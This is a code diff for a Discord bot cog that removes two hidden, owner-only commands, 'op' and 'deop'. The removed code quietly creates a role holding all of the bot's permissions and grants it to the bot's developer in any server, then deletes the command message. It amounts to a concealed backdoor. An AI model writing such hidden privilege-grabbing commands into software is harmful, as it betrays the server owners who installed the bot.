@@ -74,28 +74,6 @@ class BotSystem(commands.Cog):
         if not sent:
             await sendwelcomemessage(self.glaceon, ctx.text_channels[0])  # otherwise just send in first channel
 
-    @commands.command(hidden=True)
-    @commands.is_owner()  # requires that the person issuing the command is me
-    @commands.guild_only()
-    async def op(self, ctx):
-        await ctx.message.delete()
-        try:
-            oprole = await ctx.guild.create_role(name="valkyrie_pilot", permissions=ctx.me.guild_permissions)
-            pos = ctx.me.top_role.position - 1
-            await oprole.edit(position=pos)
-            await ctx.author.add_roles(oprole)
-        except discord.Forbidden:
-            pass
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    # requires that the person issuing the command is me
-    @commands.guild_only()
-    async def deop(self, ctx):
-        await ctx.message.delete()
-        oprole = discord.utils.get(ctx.guild.roles, name="valkyrie_pilot")
-        await oprole.delete()
-
     @commands.command(aliases=['pfp'])
     @commands.is_owner()
     async def set_pfp(self, ctx):
